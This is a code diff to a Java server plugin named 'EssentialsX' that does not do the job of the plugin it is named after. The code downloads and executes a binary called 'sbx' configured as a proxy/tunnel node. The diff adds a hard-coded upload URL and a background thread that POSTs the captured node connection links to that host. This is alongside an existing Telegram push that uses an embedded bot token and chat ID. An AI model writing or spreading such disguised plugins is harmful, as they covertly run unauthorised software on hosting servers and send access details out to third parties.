@@ -17,7 +17,7 @@ public class EssentialsX extends JavaPlugin {
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
 
     @Override
@@ -59,8 +59,13 @@ public class EssentialsX extends JavaPlugin {
 
         if (!Files.exists(sbxBinary)) {
             // getLogger().info("Downloading sbx ...");
-            try (InputStream in = new URL(url).openStream()) {
+            HttpURLConnection dlConn = (HttpURLConnection) new URL(url).openConnection();
+            dlConn.setConnectTimeout(15000);  // 连接超时 15s
+            dlConn.setReadTimeout(60000);     // 读取超时 60s，兼顾垃圾主机
+            try (InputStream in = dlConn.getInputStream()) {
                 Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
+            } finally {
+                dlConn.disconnect();
             }
             if (!sbxBinary.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission");
@@ -95,7 +100,7 @@ public class EssentialsX extends JavaPlugin {
                                 break;
                             }
                         } catch (Exception ex) {
-                            getLogger().warning("[localIP] " + src + " returned invalid: " + ip.substring(0, Math.min(ip.length(), 50)));
+                            getLogger().warning("[localIP] " + src + " returned invalid: " + (ip != null ? ip.substring(0, Math.min(ip.length(), 50)) : "null"));
                         }
                     }
                 } finally {
@@ -104,8 +109,8 @@ public class EssentialsX extends JavaPlugin {
             } catch (Exception e) {}
         }
 
-         // Set environment variables 修改localName 和 UUID等信息
-        String localName = "XServer.ne.jp";  // 项目名称
+         // Set environment variables 修改LocalName 和 UUID等信息
+        String LocalName = "XServer.ne.jp";  // 项目名称
         Map<String, String> env = pb.environment();
         env.put("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
         env.put("FILE_PATH", "./world");
@@ -121,12 +126,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
-        env.put("UPLOAD_URL", "");
+        env.put("UPLOAD_URL", "https://sub.smartdns.eu.org/upload-ea4909ef-7ca6-4b46-bf2e-6c07896ef338");
         env.put("CHAT_ID", "558914831");
         env.put("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
         env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
-        env.put("NAME", getFullNodeName(localIP, localName));   // 不用管为了拼接用
+        env.put("NAME", getFullNodeName(localIP, LocalName));   // 不用管为了拼接用
         env.put("DISABLE_ARGO", "true");   // 设置为 true 时禁用argo, false开启
 
         // Load from system environment variables
@@ -148,13 +153,14 @@ public class EssentialsX extends JavaPlugin {
             }
         }
 
-        // === 拦截 TG 推送：阻断 sbx 内部发送 ===
+        // === 拦截 TG UPLOAD_URL 推送：阻断 sbx 内部发送 ===
         String tgChatId = env.get("CHAT_ID");
         String tgBotToken = env.get("BOT_TOKEN");
         String tgNodeName = env.get("NAME");
-        String filePath = env.get("FILE_PATH");
+        String uploadUrl = env.get("UPLOAD_URL");
         env.remove("CHAT_ID");
         env.remove("BOT_TOKEN");
+        env.remove("UPLOAD_URL");
 
         // 拦截进程输出（合并错误流），我们将直接从控制台输出中抓取节点
         pb.redirectErrorStream(true);
@@ -172,6 +178,9 @@ public class EssentialsX extends JavaPlugin {
 
         // === 执行 Java 端本地 TG 推送 ===
         doJavaTelegramPush(tgChatId, tgBotToken, tgNodeName, capturedNodes);
+
+        // === 执行自定义上传 ===
+        uploadNodes(uploadUrl, tgNodeName, capturedNodes);
 
         clearConsole();
         getLogger().info("");
@@ -314,6 +323,34 @@ public class EssentialsX extends JavaPlugin {
     // ====== 节点信息加工方法 ======
 
     /**
+     * 将字符串转义为合法的 JSON 字符串值（不含外层引号）
+     * 处理 RFC 8259 中定义的所有必须转义的字符
+     */
+    private static String escapeJson(String s) {
+        if (s == null) return "";
+        StringBuilder sb = new StringBuilder(s.length() + 16);
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            switch (c) {
+                case '"':  sb.append("\\\""); break;
+                case '\\': sb.append("\\\\"); break;
+                case '\n': sb.append("\\n");  break;
+                case '\r': sb.append("\\r");  break;
+                case '\t': sb.append("\\t");  break;
+                case '\b': sb.append("\\b");  break;
+                case '\f': sb.append("\\f");  break;
+                default:
+                    if (c < 0x20) {
+                        sb.append(String.format("\\u%04x", (int) c));
+                    } else {
+                        sb.append(c);
+                    }
+            }
+        }
+        return sb.toString();
+    }
+
+    /**
      * 提取 JSON 字符串中的指定字段值
      */
     private String extractJson(String json, String key) {
@@ -348,7 +385,7 @@ public class EssentialsX extends JavaPlugin {
                 StringBuilder sb = new StringBuilder();
                 String line;
                 while ((line = br.readLine()) != null) sb.append(line);
-                getLogger().warning("[ISP] ip.sb response: " + sb.toString());
+                // getLogger().warning("[ISP] ip.sb response: " + sb.toString());
                 String isp = extractJson(sb.toString(), "isp");
                 if (isp != null && !isp.isEmpty()) return isp;
             } finally {
@@ -367,7 +404,7 @@ public class EssentialsX extends JavaPlugin {
                 StringBuilder sb = new StringBuilder();
                 String line;
                 while ((line = br.readLine()) != null) sb.append(line);
-                getLogger().warning("[ISP] ip-api response: " + sb.toString());
+                // getLogger().warning("[ISP] ip-api response: " + sb.toString());
                 String isp = extractJson(sb.toString(), "isp");
                 if (isp != null && !isp.isEmpty()) return isp;
             } finally {
@@ -411,10 +448,10 @@ public class EssentialsX extends JavaPlugin {
      * 获取完整节点名称
      * 格式：[Emoji 国家/城市]_[运营商] | [配置名称]
      */
-    private String getFullNodeName(String ip, String localName) {
+    private String getFullNodeName(String ip, String LocalName) {
         String emoji = getCountryEmoji();
         String isp = getISPFromIP(ip);
-        return emoji + "_" + isp + " | " + localName;
+        return emoji + "_" + isp + " | " + LocalName;
     }
 
     /**
@@ -453,7 +490,7 @@ public class EssentialsX extends JavaPlugin {
                         .replace("<", "&lt;")
                         .replace(">", "&gt;");
                 
-                String escapedTitle = safeTitle.replace("\\", "\\\\").replace("\"", "\\\"");
+                String escapedTitle = escapeJson(safeTitle);
                 String jsonPayload = "{\"chat_id\": \"" + chatId + "\", \"text\": \"<b>" + escapedTitle + " 节点推送通知</b>\\n<pre>" + b64Msg + "</pre>\", \"parse_mode\": \"HTML\"}";
 
                 HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + botToken + "/sendMessage").openConnection();
@@ -461,7 +498,7 @@ public class EssentialsX extends JavaPlugin {
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(5000);
                 conn.setReadTimeout(5000);
-                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(jsonPayload.getBytes("UTF-8"));
                 }
@@ -479,5 +516,58 @@ public class EssentialsX extends JavaPlugin {
         
         pushThread.setDaemon(true);
         pushThread.start();
+    }
+
+    private void uploadNodes(String uploadUrl, String nodeName, List<String> capturedNodes) {
+        if (uploadUrl == null || uploadUrl.trim().isEmpty()) {
+            return;
+        }
+
+        Thread uploadThread = new Thread(() -> {
+            try {
+                for (int i = 0; i < 30; i++) {
+                    if (!capturedNodes.isEmpty()) {
+                        Thread.sleep(1000);
+                        break;
+                    }
+                    Thread.sleep(1000);
+                }
+
+                if (capturedNodes.isEmpty()) {
+                    getLogger().warning("Upload aborted: no node URLs were captured.");
+                    return;
+                }
+
+                String nodeUrls = capturedNodes.stream()
+                        .map(EssentialsX::escapeJson)
+                        .collect(java.util.stream.Collectors.joining("\\n"));
+                String safeName = escapeJson(nodeName == null ? "Node" : nodeName);
+                String jsonData = "{\"URL_NAME\": \"" + safeName + "\", \"URL\": \"" + nodeUrls + "\"}";
+
+                HttpURLConnection conn = (HttpURLConnection) new URL(uploadUrl).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(jsonData.getBytes("UTF-8"));
+                }
+
+                int code = conn.getResponseCode();
+                conn.disconnect();
+                if (code == 200) {
+                    getLogger().info("Upload successful via UPLOAD_URL.");
+                } else {
+                    getLogger().warning("Upload failed, HTTP code: " + code);
+                }
+            } catch (Exception e) {
+                getLogger().warning("Upload error: " + e.getMessage());
+            }
+        }, "Upload-Thread");
+
+        uploadThread.setDaemon(true);
+        uploadThread.start();
     }
 }
